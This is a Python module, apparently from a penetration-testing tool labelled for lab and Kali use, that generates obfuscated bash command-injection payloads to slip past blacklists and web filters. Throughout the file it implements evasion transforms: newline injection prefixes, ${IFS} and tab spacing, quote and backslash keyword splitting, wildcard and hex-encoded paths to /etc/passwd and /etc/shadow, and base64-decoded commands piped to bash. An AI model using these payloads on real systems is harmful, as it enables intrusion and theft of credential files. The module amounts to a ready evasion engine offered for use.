"""Bash transform implementations (lab / Kali)."""

from __future__ import annotations

import base64
import random
import re
import string
from dataclasses import dataclass, field

from cantstopme.engine.blacklist import Blacklist
from cantstopme.engine.command_alternatives import apply_substitute


@dataclass
class TransformResult:
    payload: str
    applied: list[str] = field(default_factory=list)
    hints: list[str] = field(default_factory=list)


def _random_var(length: int = 2) -> str:
    return "".join(random.choice(string.ascii_uppercase) for _ in range(length))


def _split_command(command: str) -> tuple[str | None, str]:
    for sep in (";", "&&", "||", "|"):
        if sep in command:
            a, _, b = command.partition(sep)
            return a.strip(), b.strip()
    return None, command.strip()


def _command_parts(command: str) -> list[str]:
    return command.split()


def _base_token(word: str) -> str:
    return word.split("/")[0].lower()


def _needs_keyword_obf(word: str, bl: Blacklist) -> bool:
    return bl.blocks_keyword(_base_token(word))


def _insert_every_other(chars: str, insert: str) -> str:
    if len(chars) < 2:
        return chars
    parts = [chars[0]]
    for ch in chars[1:]:
        parts.append(insert)
        parts.append(ch)
    return "".join(parts)


def apply_transform(
    name: str,
    command: str,
    bl: Blacklist,
    *,
    injection_prefix: str = "1.1.1.1",
    url_encode: bool = False,
    force_substitute_id: str | None = None,
) -> TransformResult:
    fn = TRANSFORMS.get(name)
    if not fn:
        return TransformResult(command, hints=[f"Unknown transform: {name}"])
    return fn(
        command,
        bl,
        injection_prefix=injection_prefix,
        url_encode=url_encode,
        force_substitute_id=force_substitute_id,
    )


# --- separators ---


def newline_prefix(
    command: str, bl: Blacklist, *, injection_prefix: str, url_encode: bool, **_
) -> TransformResult:
    _, rest = _split_command(command)
    sep = "%0a" if url_encode else "\n"
    payload = f"{injection_prefix}{sep}{rest}"
    return TransformResult(payload, applied=["newline_prefix"], hints=["LF / %0a"])


def newline_cr_prefix(
    command: str, bl: Blacklist, *, injection_prefix: str, url_encode: bool, **_
) -> TransformResult:
    _, rest = _split_command(command)
    sep = "%0d" if url_encode else "\r"
    payload = f"{injection_prefix}{sep}{rest}"
    return TransformResult(payload, applied=["newline_cr_prefix"], hints=["CR / %0d"])


def _embedded_substring(text: str, start: int, length: int) -> bool:
    if start > 0 and (text[start - 1].isalnum() or text[start - 1] == "_"):
        return True
    end = start + length
    if end < len(text) and (text[end].isalnum() or text[end] == "_"):
        return True
    return False


def _replace_standalone_substring(text: str, needle: str, replacement: str) -> str:
    """Replace only non-embedded occurrences (e.g. cp in TCP stays, standalone cp splits)."""
    if needle not in text:
        return text
    out: list[str] = []
    pos = 0
    while True:
        idx = text.find(needle, pos)
        if idx < 0:
            out.append(text[pos:])
            break
        if _embedded_substring(text, idx, len(needle)):
            out.append(text[pos : idx + len(needle)])
            pos = idx + len(needle)
            continue
        out.append(text[pos:idx])
        out.append(replacement)
        pos = idx + len(needle)
    return "".join(out)


def break_blocked_substrings(command: str, bl: Blacklist, **_) -> TransformResult:
    """Split blocked keyword substrings (e.g. cp in TCP) so filters miss a contiguous match."""
    if bl.blocks_char("$"):
        return TransformResult(command)
    tokens = _command_parts(command)
    out = command
    applied: list[str] = []
    for kw in sorted(bl.keywords, key=len, reverse=True):
        if len(kw) < 2:
            continue
        variants = {kw, kw.upper(), kw.lower()}
        if kw.lower() == kw:
            variants.add(kw.capitalize())
        for needle in variants:
            if needle not in out:
                continue
            nl = needle.lower()
            if any(
                nl in tok.lower() and (len(tok) > len(needle) or tok.lower() == nl)
                for tok in tokens
            ):
                continue
            mid = len(needle) // 2
            replacement = needle[:mid] + "${IFS}" + needle[mid:]
            new_out = _replace_standalone_substring(out, needle, replacement)
            if new_out != out:
                out = new_out
                applied.append(f"break_substring:{needle}")
    if not applied:
        return TransformResult(command)
    return TransformResult(out, applied=applied, hints=["${IFS} breaks substring keyword match"])


def backslash_newline_break(
    command: str, bl: Blacklist, *, url_encode: bool, **_
) -> TransformResult:
    br = "%5C%0A" if url_encode else "\\\n"
    payload = command
    for token in ["/etc/passwd", ".passwd", "/etc/shadow"]:
        if token in payload:
            mid = len(token) // 2
            payload = payload.replace(token, token[:mid] + br + token[mid:], 1)
            return TransformResult(
                payload,
                applied=["backslash_newline_break"],
                hints=["PAT: cat /et\\nc/pa\\nsswd"],
            )
    return TransformResult(command)


# --- whitespace ---


def space_to_ifs(command: str, bl: Blacklist, **_) -> TransformResult:
    return TransformResult(
        command.replace(" ", "${IFS}"),
        applied=["space_to_ifs"],
    )


def space_to_tab(command: str, bl: Blacklist, *, url_encode: bool, **_) -> TransformResult:
    if url_encode:
        rep = "%09"
        hint = "URL-encoded tab — use in HTTP body, not raw bash"
    else:
        rep = "\t"
        hint = "Real TAB — works in bash"
    return TransformResult(
        command.replace(" ", rep),
        applied=["space_to_tab"],
        hints=[hint],
    )


def space_to_plus(command: str, bl: Blacklist, **_) -> TransformResult:
    return TransformResult(command.replace(" ", "+"), applied=["space_to_plus"])


def brace_expansion_path(command: str, bl: Blacklist, **_) -> TransformResult:
    parts = command.split(maxsplit=1)
    if len(parts) == 2:
        payload = "{" + parts[0] + "," + parts[1] + "}"
    else:
        payload = command
    return TransformResult(payload, applied=["brace_expansion_path"])


def input_redirection(command: str, bl: Blacklist, **_) -> TransformResult:
    parts = command.split(maxsplit=1)
    if len(parts) == 2 and parts[0].lower() == "cat":
        return TransformResult(parts[0] + "<" + parts[1], applied=["input_redirection"])
    return TransformResult(command)


def ansi_c_spaces(command: str, bl: Blacklist, **_) -> TransformResult:
    if " " not in command:
        return TransformResult(command)
    escaped = command.replace(" ", "\\x20")
    return TransformResult(
        f"$'{escaped}'",
        applied=["ansi_c_spaces"],
        hints=["PAT: $'cmd\\x20arg'"],
    )


# --- slashes ---


def slash_home_expand(command: str, bl: Blacklist, **_) -> TransformResult:
    slash = "${HOME:0:1}"
    return TransformResult(
        re.sub(r"/", slash, command),
        applied=["slash_home_expand"],
    )


def slash_path_env(command: str, bl: Blacklist, **_) -> TransformResult:
    return TransformResult(
        command.replace("/", "${PATH%%u*}"),
        applied=["slash_path_env"],
        hints=["Commix slash2env"],
    )


_WILDCARD_PATHS = {
    "/etc/passwd": "/???/??t /???/p??s??",
    ".passwd": ".p??s??",
    "/etc/shadow": "/???/??t /???/s??d??",
}

# PAT brace expansion — path without literal '/' in output
_BRACE_PATHS: dict[str, str] = {
    "/etc/passwd": "{cat,etc,passwd}",
    "/etc/shadow": "{cat,etc,shadow}",
}


def brace_slash_path(command: str, bl: Blacklist, **_) -> TransformResult:
    payload = command
    for literal, brace in _BRACE_PATHS.items():
        if literal in payload:
            return TransformResult(
                payload.replace(literal, brace, 1),
                applied=["brace_slash_path"],
                hints=["PAT: {cat,etc,passwd} — no slash character"],
            )
    return TransformResult(command)


def wildcard_path(command: str, bl: Blacklist, **_) -> TransformResult:
    payload = command
    for literal, wild in _WILDCARD_PATHS.items():
        if literal in payload:
            payload = payload.replace(literal, wild.replace(" ", "${IFS}"), 1)
            return TransformResult(payload, applied=["wildcard_path"])
    return TransformResult(command)


def hex_slash_path(command: str, bl: Blacklist, **_) -> TransformResult:
    parts = command.split(maxsplit=1)
    if len(parts) != 2 or "/" not in parts[1]:
        return TransformResult(command)
    path = parts[1]
    hex_path = "".join(f"\\x{ord(c):02x}" for c in path)
    payload = f"{parts[0]} `echo -e \"{hex_path}\"`"
    return TransformResult(payload, applied=["hex_slash_path"])


# --- command substitute (blacklisted binary -> alternative) ---


def command_substitute(
    command: str,
    bl: Blacklist,
    *,
    force_substitute_id: str | None = None,
    **_,
) -> TransformResult:
    new_cmd, alt, hints = apply_substitute(
        command,
        bl,
        alt_id=force_substitute_id,
    )
    if not alt:
        return TransformResult(command, hints=hints)
    return TransformResult(
        new_cmd,
        applied=[f"cmd_substitute:{alt.id}"],
        hints=hints,
    )


# --- keyword obfuscation helpers ---


def _map_tokens(command: str, bl: Blacklist, mapper) -> str:
    return " ".join(
        mapper(p) if _needs_keyword_obf(p, bl) else p for p in _command_parts(command)
    )


def keyword_single_quotes(command: str, bl: Blacklist, **_) -> TransformResult:
    def ins(out):
        out.append("''")

    def mapper(p):
        out: list[str] = []
        for i, ch in enumerate(p):
            if i > 0:
                ins(out)
            out.append(ch)
        return "".join(out)

    return TransformResult(_map_tokens(command, bl, mapper), applied=["keyword_single_quotes"])


def keyword_double_quotes(command: str, bl: Blacklist, **_) -> TransformResult:
    def mapper(p):
        return _insert_every_other(p, '""')

    return TransformResult(_map_tokens(command, bl, mapper), applied=["keyword_double_quotes"])


def keyword_backticks(command: str, bl: Blacklist, **_) -> TransformResult:
    def mapper(p):
        return _insert_every_other(p, "``")

    return TransformResult(_map_tokens(command, bl, mapper), applied=["keyword_backticks"])


def keyword_dollar_at(command: str, bl: Blacklist, **_) -> TransformResult:
    def mapper(p):
        return _insert_every_other(p, "$@")

    return TransformResult(_map_tokens(command, bl, mapper), applied=["keyword_dollar_at"])


def keyword_backslash(command: str, bl: Blacklist, **_) -> TransformResult:
    def mapper(p):
        return _insert_every_other(p, "\\")

    return TransformResult(_map_tokens(command, bl, mapper), applied=["keyword_backslash"])


def keyword_uninit_var(command: str, bl: Blacklist, **_) -> TransformResult:
    var = _random_var()

    def mapper(p):
        return _insert_every_other(p, f"${{{var}}}")

    return TransformResult(_map_tokens(command, bl, mapper), applied=["keyword_uninit_var"])


_WILDCARD_CMD = {
    "cat": "/???/c?t",
    "whoami": "???m??",
    "id": "??",
    "ls": "??",
    "pwd": "p??",
    "uname": "???m??",
}


def wildcard_command(command: str, bl: Blacklist, **_) -> TransformResult:
    parts = _command_parts(command)
    out = []
    changed = False
    for p in parts:
        base = _base_token(p)
        if bl.blocks_keyword(base) and base in _WILDCARD_CMD:
            out.append(_WILDCARD_CMD[base])
            changed = True
        else:
            out.append(p)
    if changed:
        return TransformResult(" ".join(out), applied=["wildcard_command"])
    return TransformResult(command)


def command_reverse(command: str, bl: Blacklist, **_) -> TransformResult:
    parts = _command_parts(command)
    out = []
    changed = False
    for p in parts:
        base = _base_token(p)
        if bl.blocks_keyword(base) and base.isalpha():
            rev = base[::-1]
            out.append(f"$(echo {rev}|rev)")
            changed = True
        else:
            out.append(p)
    if changed:
        return TransformResult(" ".join(out), applied=["command_reverse"])
    return TransformResult(command)


# --- encoding ---


def cmd_substitution(command: str, bl: Blacklist, **_) -> TransformResult:
    parts = _command_parts(command)
    out = []
    changed = False
    for p in parts:
        base = _base_token(p)
        if bl.blocks_keyword(base):
            out.append(f"$(echo {base})")
            changed = True
        else:
            out.append(p)
    if changed:
        return TransformResult(" ".join(out), applied=["cmd_substitution"])
    return TransformResult(command)


def hex_encode_path(command: str, bl: Blacklist, **_) -> TransformResult:
    return hex_slash_path(command, bl)


def _bash_binary_fragment(char: str) -> str:
    """Octal-digit-as-decimal -> binary -> $((2#...)) inside ANSI-C string (RodricBr)."""
    octal_digits = f"{ord(char):o}"  # e.g. 'l' -> 154 octal notation digits
    binary = bin(int(octal_digits, 10))[2:]
    return f"\\$(($((1<<1))#{binary}))"


def bash_binary_c(command: str, bl: Blacklist, **_) -> TransformResult:
    """
    Bash here-string + $'\\$(($((1<<1))#binary))' chain (no eval).
    Ref: https://github.com/RodricBr/Bash-Command-Injection
    """
    cmd = command.strip()
    if not cmd or len(cmd) > 120:
        return TransformResult(command)
    words = cmd.split()
    if len(words) == 1:
        body = "".join(_bash_binary_fragment(c) for c in words[0])
        payload = "${0##-}<<<$\\'" + body + "\\'"
    else:
        parts = []
        for w in words:
            body = "".join(_bash_binary_fragment(c) for c in w)
            parts.append("$\\'" + body + "\\'")
        payload = "${0##-}<<<{" + ",".join(parts) + "}"
    return TransformResult(
        payload,
        applied=["bash_binary_c"],
        hints=["RodricBr: binary->octal escape via $((2#...)) + <<<"],
    )


def variable_strip_path(command: str, bl: Blacklist, **_) -> TransformResult:
    if "/" in command:
        return TransformResult(
            command,
            applied=["variable_strip_path"],
            hints=["PAT: ${var//pattern/} — apply manually for your path"],
        )
    return TransformResult(command)


# --- advanced (PAT / Commix / HackTricks) ---

_TR_SLASH = "$(echo . | tr '!-0' '\"-1')"


def tr_dot_slash(command: str, bl: Blacklist, **_) -> TransformResult:
    if not bl.blocks_char("/") or "/" not in command:
        return TransformResult(command)
    payload = command.replace("/", _TR_SLASH)
    return TransformResult(
        payload,
        applied=["tr_dot_slash"],
        hints=["PAT: tr '!-0' '\"-1' from dot"],
    )


def xxd_slash_path(command: str, bl: Blacklist, **_) -> TransformResult:
    parts = command.split(maxsplit=1)
    if len(parts) != 2 or "/" not in parts[1]:
        return TransformResult(command)
    path = parts[1]
    hex_compact = "".join(f"{ord(c):02x}" for c in path)
    payload = f"{parts[0]} `xxd -r -p <<< {hex_compact}`"
    return TransformResult(
        payload,
        applied=["xxd_slash_path"],
        hints=["PAT: xxd -r -p <<< hex"],
    )


def base64_wrap_command(command: str, bl: Blacklist, **_) -> TransformResult:
    if len(command) > 200:
        return TransformResult(command)
    encoded = base64.b64encode(command.encode()).decode()
    payload = f"echo {encoded}|base64 -d|bash"
    return TransformResult(
        payload,
        applied=["base64_wrap_command"],
        hints=["PAT/HackTricks: echo b64 | base64 -d | bash"],
    )


def keyword_dollar_empty_paren(command: str, bl: Blacklist, **_) -> TransformResult:
    def mapper(p: str) -> str:
        base = _base_token(p)
        if bl.blocks_keyword(base) and len(p) > 2:
            mid = len(p) // 2
            return p[:mid] + "$()" + p[mid:]
        return p

    out = _map_tokens(command, bl, mapper)
    if out != command:
        return TransformResult(out, applied=["keyword_dollar_empty_paren"], hints=["PAT: who$()ami"])
    return TransformResult(command)


def space_vertical_tab(command: str, bl: Blacklist, *, url_encode: bool, **_) -> TransformResult:
    """Only for URL-encoded web inject; raw \\v breaks terminal display on Windows."""
    if not url_encode or " " not in command:
        return TransformResult(command)
    return TransformResult(
        command.replace(" ", "%0b"),
        applied=["space_vertical_tab"],
        hints=["Commix: space2vtab (%0b)"],
    )


def chain_and_separator(command: str, bl: Blacklist, **_) -> TransformResult:
    if not bl.blocks_char(";") or bl.blocks_char("&"):
        return TransformResult(command)
    if ";" not in command:
        return TransformResult(command)
    return TransformResult(
        command.replace(";", "&&"),
        applied=["chain_and_separator"],
        hints=["PortSwigger/WAF: && thay ;"],
    )


TRANSFORMS = {
    "break_blocked_substrings": break_blocked_substrings,
    "newline_prefix": newline_prefix,
    "newline_cr_prefix": newline_cr_prefix,
    "backslash_newline_break": backslash_newline_break,
    "space_to_ifs": space_to_ifs,
    "space_to_tab": space_to_tab,
    "space_to_plus": space_to_plus,
    "brace_expansion_path": brace_expansion_path,
    "input_redirection": input_redirection,
    "ansi_c_spaces": ansi_c_spaces,
    "slash_home_expand": slash_home_expand,
    "slash_path_env": slash_path_env,
    "brace_slash_path": brace_slash_path,
    "wildcard_path": wildcard_path,
    "hex_slash_path": hex_slash_path,
    "keyword_single_quotes": keyword_single_quotes,
    "keyword_double_quotes": keyword_double_quotes,
    "keyword_backticks": keyword_backticks,
    "keyword_dollar_at": keyword_dollar_at,
    "keyword_backslash": keyword_backslash,
    "keyword_uninit_var": keyword_uninit_var,
    "wildcard_command": wildcard_command,
    "command_reverse": command_reverse,
    "cmd_substitution": cmd_substitution,
    "hex_encode_path": hex_encode_path,
    "variable_strip_path": variable_strip_path,
    "bash_binary_c": bash_binary_c,
    "command_substitute": command_substitute,
    "tr_dot_slash": tr_dot_slash,
    "xxd_slash_path": xxd_slash_path,
    "base64_wrap_command": base64_wrap_command,
    "keyword_dollar_empty_paren": keyword_dollar_empty_paren,
    "space_vertical_tab": space_vertical_tab,
    "chain_and_separator": chain_and_separator,
    # legacy alias
    "slash_env_expand": slash_home_expand,
}
